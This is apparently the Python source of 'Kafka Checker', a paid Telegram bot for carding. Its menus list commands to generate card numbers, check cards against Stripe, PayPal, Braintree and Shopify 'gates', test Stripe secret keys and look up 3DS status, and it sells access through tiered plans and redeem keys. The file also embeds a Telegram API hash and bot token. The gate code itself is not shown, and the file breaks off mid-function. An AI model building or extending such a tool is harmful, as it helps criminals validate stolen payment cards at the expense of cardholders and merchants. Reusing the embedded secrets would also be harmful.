import os
import shutil
import sys
import json
import logging
from datetime import datetime, timedelta, timezone
import random
from bs4 import BeautifulSoup
import string
import asyncio
import zipfile
import time
import aiofiles
import aiohttp
import requests
import re
import html
import math
from pyrogram import Client, filters, enums
from pyrogram.handlers import MessageHandler
import sys
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import subprocess
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from functools import wraps
from aiohttp_socks import ProxyConnector


#-----------Auto restart if change--------

class ChangeHandler(FileSystemEventHandler):
    def on_any_event(self, event):
        if event.event_type in ('modified', 'created', 'deleted') and event.src_path.endswith('.py'):
            print(f"\nDetected change in {event.src_path}. Restarting bot...")
            os.execv(sys.executable, ['python'] + sys.argv)

def start_watching(path='.'):
    event_handler = ChangeHandler()
    observer = Observer()
    observer.schedule(event_handler, path, recursive=True)
    observer.start()
    print(f"\nStarted watching for changes in {path}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

#-----------'lisa_is_me'-------------------

API_ID = '29701286'
API_HASH = '9ff88fccea278b4ce7fc651cb7541b8e'
BOT_TOKEN = '7283204521:AAGxizlwfuJapg4INUMnwmjl0Xg7O-v3mb0'

app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

users_file = 'users.json'
keys_file = 'keys.json'
groups_file = 'groups.json'
ban_file = 'ban.json'
plans = ['Free', 'Plus', 'Admin', 'The God']
the_god_ids = ['1192484969', '1469152765']
admin_ids = ['1191846969', '6789842549', '5244268759']

BOT_USERNAME = 'kafka_checker_bot'

last_execution_time = {}

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_json_file(filename):
    if not os.path.exists(filename):
        with open(filename, 'w') as f:
            json.dump({}, f)
        return {}
    if os.stat(filename).st_size == 0:
        with open(filename, 'w') as f:
            json.dump({}, f)
        return {}
    with open(filename, 'r') as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            with open(filename, 'w') as f:
                json.dump({}, f)
            return {}

def save_json_file(data, filename):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

def load_groups():
    return load_json_file('groups.json')

def save_groups(groups):
    save_json_file(groups, 'groups.json')

def is_banned(user_id):
    try:
        banned_users = load_json_file(ban_file)
        return str(user_id) in banned_users
    except Exception as e:
        logger.error(f"Error checking ban status: {str(e)}")
        return False
        
def load_banned_bins():
    try:
        with open('bins.json', 'r') as f:
            return json.load(f).get("banned_bins", [])
    except FileNotFoundError:
        return []

def save_banned_bins(banned_bins):
    with open('bins.json', 'w') as f:
        json.dump({"banned_bins": banned_bins}, f)

def ban_user(user_id):
    try:
        banned_users = load_json_file(ban_file)
        banned_users[str(user_id)] = True
        save_json_file(banned_users, ban_file)
        logger.info(f"User {user_id} has been banned.")
    except Exception as e:
        logger.error(f"Error banning user: {str(e)}")

def unban_user(user_id):
    try:
        banned_users = load_json_file(ban_file)
        if str(user_id) in banned_users:
            del banned_users[str(user_id)]
            save_json_file(banned_users, ban_file)
            logger.info(f"User {user_id} has been unbanned.")
        else:
            logger.warning(f"User {user_id} is not in the banned list.")
    except Exception as e:
        logger.error(f"Error unbanning user: {str(e)}")

async def send_backup_files():
    while True:
        for god_id in [1192484969, 1469152765]:
            try:
                await app.send_document(god_id, users_file, caption='Backup of users.json')
                await app.send_document(god_id, keys_file, caption='Backup of keys.json')
                logger.info(f'Successfully sent backup files to The God user: {god_id}')
            except Exception as e:
                logger.error(f'Failed to send backup files to The God user: {god_id}, Error: {e}')
        await asyncio.sleep(200)

def register_user(user_id, username, full_name, referrer=None):
    users = load_json_file(users_file)
    if users is None:
        users = {}
    if str(user_id) in users:
        user_info = users[str(user_id)]
        expires_at_str = user_info.get('expires_at')
        if expires_at_str:
            expires_at = datetime.strptime(expires_at_str, '%d-%m-%Y').replace(tzinfo=timezone.utc)
            if expires_at < datetime.now(timezone.utc):
                user_info['plan'] = 'Free'
                user_info['expires_at'] = None
                users[str(user_id)] = user_info
                save_json_file(users, users_file)
        return False
    if str(user_id) in the_god_ids:
        plan = 'The God'
    elif str(user_id) in admin_ids:
        plan = 'Admin'
    else:
        plan = 'Free'
    users[str(user_id)] = {
        'full_name': full_name,
        'username': username,
        'plan': plan,
        'registered_at': datetime.now(timezone.utc).strftime('%d-%m-%Y'),
        'referrals': 0,
        'referred_by': referrer,
        'expires_at': None
    }
    if referrer and str(referrer) in users:
        referrer_user = users[str(referrer)]
        referrer_user['referrals'] += 1
        if referrer_user['plan'] not in ['The God', 'Admin']:
            if referrer_user['referrals'] % 7 == 0:
                additional_days = 8
                if referrer_user['expires_at']:
                    current_expiration = datetime.strptime(referrer_user['expires_at'], '%d-%m-%Y').replace(tzinfo=timezone.utc)
                    new_expiration = current_expiration + timedelta(days=additional_days)
                else:
                    new_expiration = datetime.now(timezone.utc) + timedelta(days=additional_days)
                referrer_user['expires_at'] = new_expiration.strftime('%d-%m-%Y')
                referrer_user['plan'] = 'Plus'
    save_json_file(users, users_file)
    return True

def get_user_info(user_id):
    users = load_json_file(users_file)
    user_info = users.get(str(user_id), None)

    if user_info:
        expires_at_str = user_info.get('expires_at')
        if expires_at_str:
            expires_at = datetime.strptime(expires_at_str, '%d-%m-%Y').replace(tzinfo=timezone.utc)
            if expires_at < datetime.now(timezone.utc):
                user_info['plan'] = 'Free'
                user_info['expires_at'] = None
                users[str(user_id)] = user_info
                save_json_file(users, users_file)
    
    return user_info

def requires_auth(func):
    @wraps(func)
    async def wrapper(client, message, *args, **kwargs):
        if is_banned(message.from_user.id):
            await message.reply('🚫 <b>You are banned from using this bot.</b>', parse_mode=enums.ParseMode.HTML)
            return

        user_info = get_user_info(message.from_user.id)
        if user_info:
            if message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                authorized_groups = load_groups()
                if str(message.chat.id) not in authorized_groups:
                    await message.reply('⚠️ <b>This group is not authorized to use this bot.</b>', parse_mode=enums.ParseMode.HTML)
                    return
            return await func(client, message, user_info, *args, **kwargs)
        else:
            await message.reply('⚠️ <b>You need to register first using /reg command.</b>', parse_mode=enums.ParseMode.HTML)
    return wrapper


def universal_handler(func):
    @wraps(func)
    async def wrapper(client, message, *args, **kwargs):
        return await func(client, message,  *args, **kwargs)
    return wrapper

cooldown_periods = {
    'Free': 15,
    'Plus': 5,
    'Admin': 0,
    'The God': 0
}

def ban_bin(func):
    @wraps(func)
    async def wrapper(client, message, user_info, *args, **kwargs):
        cc_info = message.text.split()

        if len(cc_info) < 2:
            return await func(client, message, user_info, *args, **kwargs)

        banned_bins = load_banned_bins()
        cc_bin = cc_info[1][:6]
        if cc_bin in banned_bins:
            await message.reply("🚫 **This BIN is banned. You cannot check this cc.**")
            return

        return await func(client, message, user_info, *args, **kwargs)

    return wrapper

def anti_spam(func):
    @wraps(func)
    async def wrapper(client, message, user_info, *args, **kwargs):
        user_id = str(message.from_user.id)
        plan = user_info.get('plan', 'Free')
        current_time = time.time()

        if message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
            authorized_groups = load_groups()
            if str(message.chat.id) in authorized_groups:
                return await func(client, message, user_info, *args, **kwargs)

        last_time = last_execution_time.get(user_id, 0)
        cooldown_period = cooldown_periods.get(plan, 10)

        if current_time - last_time < cooldown_period:
            remaining_time = int(cooldown_period - (current_time - last_time))
            await message.reply(f'<b>⏳️Please wait {remaining_time} seconds before sending another command.\n🛸Join @kafka_checker group to use the bot without limitations.</b>', parse_mode=enums.ParseMode.HTML)
            return

        last_execution_time[user_id] = current_time
        return await func(client, message, user_info, *args, **kwargs)
    
    return wrapper

def requires_plan(func):
    @wraps(func)
    async def wrapper(client, message, *args, **kwargs):
        if is_banned(message.from_user.id):
            await message.reply('🚫 <b>You are banned from using this bot.</b>', parse_mode=enums.ParseMode.HTML)
            return

        user_info = get_user_info(message.from_user.id)
        if user_info:
            return await func(client, message, user_info, *args, **kwargs)
        else:
            await message.reply('⚠️ <b>You need to register first using /reg command.</b>', parse_mode=enums.ParseMode.HTML)
    return wrapper

def generate_key(prefix, length=9):
    characters = string.ascii_letters + string.digits
    key = prefix + ''.join(random.choice(characters) for _ in range(length))
    return key

def parse_duration(duration):
    amount = int(duration[:-1])
    unit = duration[-1]
    if unit == 'd':
        return timedelta(days=amount)
    elif unit == 'w':
        return timedelta(weeks=amount)
    elif unit == 'm':
        return timedelta(days=amount * 30)
    else:
        return None

def command_with_mention(commands):
    return (filters.command(commands, prefixes=['/', '.']) | 
            filters.regex(rf"^({'|'.join([f'/{cmd}@{BOT_USERNAME}' for cmd in commands])})$") | 
            filters.regex(r"^(" + '|'.join([r'\.' + cmd + r'@' + BOT_USERNAME for cmd in commands]) + r")$"))

usage_limits = {
    'Free': 3,
    'Plus': 1000,
    'Admin': float('inf'),
    'The God': float('inf')
}

user_usage = {}

def is_authorized_group(chat_id):
    authorized_groups = load_json_file(groups_file)
    return str(chat_id) in authorized_groups

def check_usage_limit(func):
    @wraps(func)
    async def wrapper(client, message, user_info, *args, **kwargs):
        user_id = message.from_user.id
        plan = user_info.get('plan', 'Free')
        chat_id = message.chat.id
        current_time = time.time()

        if is_authorized_group(chat_id):
            return await func(client, message, user_info, *args, **kwargs)

        if user_id not in user_usage:
            user_usage[user_id] = {'count': 0, 'last_reset': current_time}
        
        if current_time - user_usage[user_id]['last_reset'] > 86400: 
            user_usage[user_id] = {'count': 0, 'last_reset': current_time}

        usage_count = user_usage[user_id]['count']
        usage_limit = usage_limits.get(plan, usage_limits['Free'])

        if usage_count >= usage_limit:
            await message.reply(
                f"🚫 <b>You have reached your usage limit for the day.</b>\n\n"
                f"🔄 <b>Plan:</b> {plan}\n"
                f"🔄 <b>Usage:</b> {usage_count}/{usage_limit if usage_limit != float('inf') else '∞'}\n\n"
                f"🔄 <b>Join the <a href='https://t.me/kafka_checker'>Kafka Checker</a> group to use the bot without limitations.</b>",
                parse_mode=enums.ParseMode.HTML
            )
            return

        user_usage[user_id]['count'] += 1
        return await func(client, message, user_info, *args, **kwargs)

    return wrapper

def remove_expired_keys():
    keys = load_json_file(keys_file)
    current_time = datetime.now(timezone.utc)
    expired_keys = [key for key, value in keys.items() if datetime.strptime(value['expires_at'], '%d-%m-%Y').replace(tzinfo=timezone.utc) < current_time]
    for key in expired_keys:
        del keys[key]
    save_json_file(keys, keys_file)
    return expired_keys

def get_unredeemed_keys():
    keys = load_json_file(keys_file)
    unredeemed_keys = {key: value for key, value in keys.items() if not value['redeemed_by']}
    return unredeemed_keys

#-------------Bot---------------------

import random
import math
from pyrogram import enums
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery

captcha_data = {}

@app.on_message(command_with_mention("start"))
async def start(client, message, *args, **kwargs):
    args = message.text.split()
    referrer_id = args[1] if len(args) > 1 else None
    user = message.from_user
    full_name = user.first_name + (' ' + user.last_name if user.last_name else '')
    username = '@' + user.username if user.username and not user.username.startswith('@') else user.username

    captcha_question, correct_answer, options = generate_captcha()
    buttons = InlineKeyboardMarkup(options)

    captcha_message = await message.reply(
        f'<b>🤖 Solve the CAPTCHA:</b> {captcha_question}\n'
        'Choose the correct answer:',
        reply_markup=buttons,
        parse_mode=enums.ParseMode.HTML
    )

    start_time = time.time()
    captcha_data[user.id] = {
        'correct_answer': correct_answer,
        'start_time': start_time,
        'username': username,
        'full_name': full_name,
        'referrer_id': referrer_id,
        'captcha_message': captcha_message
    }

@app.on_callback_query(filters.regex(r"^captcha_"))
async def handle_captcha_response(client, callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    user_data = captcha_data.get(user_id)

    if user_data is None:
        await callback_query.answer('No CAPTCHA in progress. Please start again.', show_alert=True)
        return

    correct_answer = user_data['correct_answer']
    start_time = user_data['start_time']

    if time.time() - start_time > 300:
        await user_data['captcha_message'].delete()
        await callback_query.answer('⏳ CAPTCHA time expired. Please start again.', show_alert=True)
        del captcha_data[user_id]
        return

    if callback_query.data.split('_')[1] == correct_answer:
        registered = register_user(user_id, user_data['username'], user_data['full_name'], user_data['referrer_id'])
        await user_data['captcha_message'].delete()
        del captcha_data[user_id]

        if registered:
            await callback_query.message.reply(
                '<b>✨ Welcome!</b> You have been registered successfully. 🎉\n'
                'Use <b>/cmd</b> to see all commands\n'
                'Use <b>/invite</b> to see your invite link!!\n'
                'Use <b>/price</b> to get price list\n'
                '☆ 7 invites = 8 days Plus Plan',
                parse_mode=enums.ParseMode.HTML
            )
            if user_data['referrer_id']:
                referrer = get_user_info(user_data['referrer_id'])
                if referrer:
                    await callback_query.message.reply(f"🎉 <b>You have been referred by:</b> {referrer['username']}", parse_mode=enums.ParseMode.HTML)
        else:
            await callback_query.message.reply(
                '🤯 <b>You are already registered...‼️</b>\n'
                'Use <b>/cmd</b> to see all commands\n'
                'Use <b>/invite</b> to see your invite link!!\n'
                'Use <b>/price</b> to get price list\n'
                '☆ 7 invites = 8 days Plus Plan',
                parse_mode=enums.ParseMode.HTML
            )
    else:
        await user_data['captcha_message'].delete()
        await callback_query.answer('❌ Incorrect answer. Please try again.', show_alert=True)
        del captcha_data[user_id]

def generate_captcha():
    operators = ['+', '-', '*', '/', '√', 'π']
    question_type = random.choice(['basic', 'advanced'])

    if question_type == 'basic':
        num1 = random.randint(1, 10)
        num2 = random.randint(1, 10)
        operator = random.choice(operators[:4]) 

        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        elif operator == '/':
            answer = round(num1 / num2, 2)

        question = f"{num1} {operator} {num2}"

    else:
        advanced_type = random.choice(['sqrt', 'pi', 'function'])
        if advanced_type == 'sqrt':
            num = random.randint(1, 10)
            answer = round(math.sqrt(num), 2)
            question = f"√{num}"
        elif advanced_type == 'pi':
            factor = random.randint(1, 10)
            answer = round(math.pi * factor, 2)
            question = f"π × {factor}"
        else:
            x = random.randint(1, 5)
            answer = round(math.pow(x, 2) + 2 * x + 1, 2)
            question = f"f({x}) = {x}² + 2*{x} + 1"

    options = [answer]
    while len(options) < 4:
        wrong_answer = random.uniform(1, 20)
        wrong_answer = round(wrong_answer, 2)
        if wrong_answer not in options:
            options.append(wrong_answer)

    random.shuffle(options)
    buttons = [[InlineKeyboardButton(str(option), callback_data=f"captcha_{option}") for option in options]]
    return question, str(answer), buttons

#cmd list
commands_info = {
  "basic_cmds": {
    "title": "Basic Commands",
    "commands": [
      {"cmd": "/start", "desc": "Start me!", "status": "On ✅"},
      {"cmd": "/reg", "desc": "Register user", "status": "On ✅"},
      {"cmd": "/referral", "desc": "Get referral link", "status": "On ✅"},
      {"cmd": "/invite", "desc": "The same as /referral", "status": "On ✅"}
    ]
  },
  "admin_cmds": {
    "title": "Admin Commands",
    "commands": [
      {"cmd": "/key", "desc": "Create redeem keys", "status": "On ✅"},
      {"cmd": "/redeem", "desc": "Redeem a key", "status": "On ✅"},
      {"cmd": "/clearusers", "desc": "Clear all users", "status": "On ✅"},
      {"cmd": "/clearkeys", "desc": "Clear all keys", "status": "On ✅"},
      {"cmd": "/send", "desc": "Broadcast message to users", "status": "On ✅"},
      {"cmd": "/ban", "desc": "Ban a user", "status": "On ✅"},
      {"cmd": "/unban", "desc": "Unban a user", "status": "On ✅"},
      {"cmd": "/latestkey", "desc": "Get all latest and unredeem keys, remove expired keys", "status": "On ✅"},
      {"cmd": "/banbin", "desc": "Ban a bin", "status": "On ✅"},
      {"cmd": "/unbanbin", "desc": "Unban an a bin", "status": "On ✅"},
      {"cmd": "/update", "desc": "Update new code for Kafka", "status": "On ✅"},
      {"cmd": "/dash", "desc": "Kafka Dashboard", "status": "On ✅"},
      {"cmd": "/updata", "desc": "Update new database for Kafka", "status": "On ✅"},
      {"cmd": "/autobackup", "desc": "AutoBackup Kafka Checker Bot", "status": "On ✅"},
      {"cmd": "/downgrade", "desc": "Downgrade User Plan to Free", "status": "On ✅"},
    ]
  },
  "tools_cmds": {
    "title": "Tools Commands",
    "commands": [
      {"cmd": "/dork", "desc": "Dorking Sites", "status": "Off ❌"},
      {"cmd": "/bin", "desc": "Get BIN info", "status": "On ✅"},
      {"cmd": "/gen", "desc": "Generate CC", "status": "On ✅"},
      {"cmd": "/gate", "desc": "Check Gateways", "status": "On ✅"},
      {"cmd": "/massgate", "desc": "Mass Gate Check", "status": "On ✅"},
      {"cmd": "/sk", "desc": "Sk Key Checker", "status": "On ✅"},
      {"cmd": "/msk", "desc": "Mass Sk Key Checker", "status": "On ✅"},      
      {"cmd": "/fake", "desc": "Fake Database", "status": "Off ❌"},
      {"cmd": "/ip", "desc": "Proxies checker", "status": "On ✅"},
      {"cmd": "/text", "desc": "Text to file txt", "status": "On ✅"},
            {"cmd": "/split", "desc": "Split your ccs txt file to smaller part", "status": "On ✅"},
            {"cmd": "/mbin", "desc": "Multiple bins", "status": "On ✅"},
            {"cmd": "/genbin", "desc": "Genrate bins", "status": "On ✅"},
            {"cmd": "/vbv", "desc": "3DS Lookup", "status": "On ✅"},
            {"cmd": "/mvbv", "desc": "3DS Lookup Mass", "status": "On ✅"},         
        ]
    },
    "gates_cmds": {
        "title": "Gates Commands",
        "commands": [
            {"cmd": "/chk", "desc": "Stripe Auth Gate", "status": "On ✅"},
            {"cmd": "/pp", "desc": "PayPal Gate", "status": "On ✅"},
            {"cmd": "/sh", "desc": "Shopify + PayPal 5$ Gate", "status": "On ✅"},
            {"cmd": "/so", "desc": "Shopify + PayPal 5$ Gate", "status": "On ✅"},
            {"cmd": "/su", "desc": "Shopify + PayPal 9.00$ Gate", "status": "off ❌"},
            {"cmd": "/li", "desc": "Shopify + PayPal 9.00$ Gate", "status": "Off ❌"},
            {"cmd": "/masspp", "desc": "Mass PayPal Checker", "status": "On ✅"},
            {"cmd": "/massau", "desc": "Mass Stripe Auth Gate", "status": "Off ✅"},
            {"cmd": "/chs", "desc": "Stripe 10$", "status": "On ❌"},
            {"cmd": "/chg", "desc": "Stripe 5$", "status": "Off ❌"},
            {"cmd": "/masschg", "desc": "Mass Stripe 5$", "status": "Off ❌"},
            {"cmd": "/vbv", "desc": "VBV Lookup", "status": "On ✅"},
            {"cmd": "/mvbv", "desc": "Mass VBV Lookup", "status": "On ✅"},
            {"cmd": "/masschs", "desc": "Mass Stripe 10$", "status": "off ❌"},
            {"cmd": "/cvv", "desc": "Stripe 1$", "status": "Off ❌"},
            {"cmd": "/mcvv", "desc": "Stripe mass 1$", "status": "Off ❌"},            
            {"cmd": "/xvv", "desc": "Stripe 25$", "status": "off ❌"},
            {"cmd": "/svv", "desc": "SK Based 1$", "status": "On ✅"},
           {"cmd": "/msvv", "desc": "SK Based Mass 1$", "status": "On ✅"},            
            {"cmd": "/br", "desc": "Braintree 1$", "status": "On ✅"},
            {"cmd": "/mxvv", "desc": "Stripe mass 25£", "status": "off ❌"},
            {"cmd": "/sb", "desc": "Stripe VBV", "status": "off ❌"},            
            {"cmd": "/st", "desc": "Stripe 8$", "status": "off ❌"},
            {"cmd": "/mst", "desc": "Stripe mass 8$", "status": "off ❌"},
            {"cmd": "/stt", "desc": "Stripe 6$", "status": "off ❌"},
            {"cmd": "/mstt", "desc": "Stripe Mass 6$", "status": "Off ❌"},
            {"cmd": "/cc", "desc": "Braintree Auth CVV", "status": "off ❌"},
            {"cmd": "/b3", "desc": "Braintree Auth 2", "status": "off ❌"},
            {"cmd": "/xs", "desc": "Stripe 5$", "status": "Ofg ❌"},
            {"cmd": "/mxs", "desc": "Stripe Mass 5$", "status": "Off ❌"},
            {"cmd": "/xx", "desc": "Stripe 19$", "status": "On ✅"},
            {"cmd": "/mxx", "desc": "Stripe Mass 19$", "status": "On ✅"},
            {"cmd": "/bt", "desc": "Braintree 7$", "status": "Off ❌"},
            {"cmd": "/mbt", "desc": "Braintree 7$ Mass", "status": "Off ❌"},                                                                  
        ]
    }
}

user_ping = {}

@app.on_message(command_with_mention(["cmd", "cmds", "help", "commands"]))
@requires_plan
@universal_handler
async def cmd(client, message, user_info, *args, **kwargs):
    try:
        start_time = time.time()

        buttons = [
            [InlineKeyboardButton("Basic", callback_data="basic_cmds"), InlineKeyboardButton("Admin", callback_data="admin_cmds")],
            [InlineKeyboardButton("Tools", callback_data="tools_cmds"), InlineKeyboardButton("Gates", callback_data="gates_cmds")]
        ]

        keyboard = InlineKeyboardMarkup(buttons)

        message_sent = await message.reply(
            "𝙆𝙖𝙛𝙠𝙖 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨\n"
            "▬▬▬▬▬▬▬▬\n"
            f"[〆]>🌐 <b>Ping:</b> Calculating...\n"
            f"[〆]>📋 <b>Available Commands:</b> Fetching...\n"
            f"[〆]>🚀 <b>Version:</b> Updating",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=keyboard
        )
        
        end_time = time.time()
        ping = int((end_time - start_time) * 1000)
        
        user_ping[message.from_user.id] = ping

        await message_sent.edit_text(
            "𝙆𝙖𝙛𝙠𝙖 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨\n"
            "▬▬▬▬▬▬▬▬\n"
            f"[〆]>🌐 <b>Ping:</b> <code>{ping} ms</code>\n"
            f"[〆]>📋 <b>Available Commands:</b> <code>{sum(len(v['commands']) for v in commands_info.values())}</code>\n"
            f"[〆]>🚀 <b>Version:</b> <code>{ver}</code>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error in /cmd: {e}")

async def show_commands(callback_query, category):
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info[category]['commands']])
    title = commands_info[category]['title']
    
    await callback_query.edit_message_text(f"<b>{title}:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"basic_cmds"))
async def show_basic_cmds(client, callback_query):
    await show_commands(callback_query, "basic_cmds")

@app.on_callback_query(filters.regex(r"admin_cmds"))
async def show_admin_cmds(client, callback_query):
    await show_commands(callback_query, "admin_cmds")

@app.on_callback_query(filters.regex(r"tools_cmds"))
async def show_tools_cmds(client, callback_query):
    await show_commands(callback_query, "tools_cmds")

@app.on_callback_query(filters.regex(r"gates_cmds"))
async def show_gates_cmds(client, callback_query):
    buttons = [
        [InlineKeyboardButton("Braintree", callback_data="gates_braintree_cmds"), InlineKeyboardButton("Stripe", callback_data="gates_stripe_cmds")],
        [InlineKeyboardButton("Shopify", callback_data="gates_shopify_cmds"), InlineKeyboardButton("SK Based", callback_data="gates_sk_cmds")],
        [InlineKeyboardButton("PayPal", callback_data="gates_paypal_cmds")],
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text("Select a gate category:", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"gates_braintree_cmds"))
async def show_braintree_cmds(client, callback_query):
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info["gates_cmds"]['commands'] if 'Braintree' in cmd['desc']])
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text(f"<b>Braintree Commands:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"gates_stripe_cmds"))
async def show_stripe_cmds(client, callback_query):
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info["gates_cmds"]['commands'] if 'Stripe' in cmd['desc']])
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text(f"<b>Stripe Commands:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"gates_shopify_cmds"))
async def show_shopify_cmds(client, callback_query):
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info["gates_cmds"]['commands'] if 'Shopify' in cmd['desc']])
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text(f"<b>Shopify Commands:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"gates_sk_cmds"))
async def show_sk_cmds(client, callback_query):
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info["gates_cmds"]['commands'] if 'SK' in cmd['desc']])
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text(f"<b>SK Based Commands:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"gates_paypal_cmds"))
async def show_paypal_cmds(client, callback_query):
    cmds = "\n\n".join([f"[※]》{cmd['cmd']} - {cmd['desc']} | [{cmd['status']}]" for cmd in commands_info["gates_cmds"]['commands'] if 'PayPal' in cmd['desc']])
    buttons = [
        [InlineKeyboardButton("Back", callback_data="back_cmds"), InlineKeyboardButton("Close", callback_data="close_cmds")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await callback_query.edit_message_text(f"<b>PayPal Commands:</b>\n▬▬▬▬▬▬▬▬\n{cmds}", reply_markup=keyboard, parse_mode=enums.ParseMode.HTML)

@app.on_callback_query(filters.regex(r"back_cmds"))
async def back_cmds(client, callback_query):
    try:
        user_id = callback_query.from_user.id
        ping = user_ping.get(user_id, 0)

        buttons = [
            [InlineKeyboardButton("Basic", callback_data="basic_cmds"), InlineKeyboardButton("Admin", callback_data="admin_cmds")],
            [InlineKeyboardButton("Tools", callback_data="tools_cmds"), InlineKeyboardButton("Gates", callback_data="gates_cmds")]
        ]
        keyboard = InlineKeyboardMarkup(buttons)

        await callback_query.edit_message_text(
            "𝙆𝙖𝙛𝙠𝙖 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨\n"
            "▬▬▬▬▬▬▬▬\n"
            f"[〆]>🌐 <b>Ping:</b> <code>{ping} ms</code>\n"
            f"[〆]>📋 <b>Available Commands:</b> <code>{sum(len(v['commands']) for v in commands_info.values())}</code>\n"
            f"[〆]>🚀 <b>Version:</b> <code>{ver}</code>",
            parse_mode=enums.ParseMode.HTML,
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error in back_cmds: {e}")

@app.on_callback_query(filters.regex(r"close_cmds"))
async def close_cmds(client, callback_query):
    try:
        await callback_query.message.delete()
    except Exception as e:
        logger.error(f"Error in close_cmds: {e}")

@app.on_message(command_with_mention("reg"))
async def register(client, message, *args, **kwargs):
    user = message.from_user
    full_name = user.first_name + (' ' + user.last_name if user.last_name else '')
    username = '@' + user.username if user.username and not user.username.startswith('@') else user.username
    registered = register_user(user.id, username, full_name)
    if registered:
        await message.reply(
            '<b>✨ Welcome!</b> You have been registered successfully. 🎉\n'
            'Use <b>/cmd</b> to see all commands\n'
            'Use <b>/invite</b> to see your invite link!!\n'
            '☆ 7 invites = 8 days Plus Plan',
            parse_mode=enums.ParseMode.HTML
        )
    else:
        await message.reply(
            '🤯 <b>You are already registered...‼️</b>\n'
            'Use <b>/cmd</b> to see all commands\n'
            'Use <b>/invite</b> to see your invite link!!\n'
            '☆ 7 invites = 8 days Plus Plan',
            parse_mode=enums.ParseMode.HTML
        )

#price list

@app.on_message(command_with_mention("price"))
@universal_handler
@requires_auth
@requires_plan
@anti_spam
async def show_plans(client, message, user_info, *args, **kwargs):
    buttons = [
        [InlineKeyboardButton("⭐ Starter - 1 Week", callback_data="starter_plan"),
         InlineKeyboardButton("🌟 Silver - 15 Days", callback_data="silver_plan")],
        [InlineKeyboardButton("🏆 Gold - 1 Month", callback_data="gold_plan"),
         InlineKeyboardButton("👑 Lifetime", callback_data="lifetime_plan")],
        [InlineKeyboardButton("💰 Buy Now - Lisa", url="https://t.me/lisa_is_me"),
         InlineKeyboardButton("💳 Buy Now - Xronak", url="https://t.me/xronak")],
        [InlineKeyboardButton("❌ Close", callback_data="close_plans")]
    ]

    keyboard = InlineKeyboardMarkup(buttons)

    await message.reply(
        "<b>🌼 𝙆𝙖𝙛𝙠𝙖 𝙋𝙡𝙖𝙣𝙨</b>\n"
        "▬▬▬▬▬▬▬▬\n\n"
        "◉ <b>Choose the plan that best suits your needs.</b>\n\n"
        "⏳ Your plan expires automatically after the chosen duration.\n"
        "💸 <b>To continue using our services, purchase a new plan.</b>\n"
        "⚠️ <b>All purchases are final and non-refundable.</b>\n"
        "🚫 <b>Plan transfers are not allowed.</b>\n"
        "┄┄┄┄┄┄┄┄┄┄┄┄┄┄",
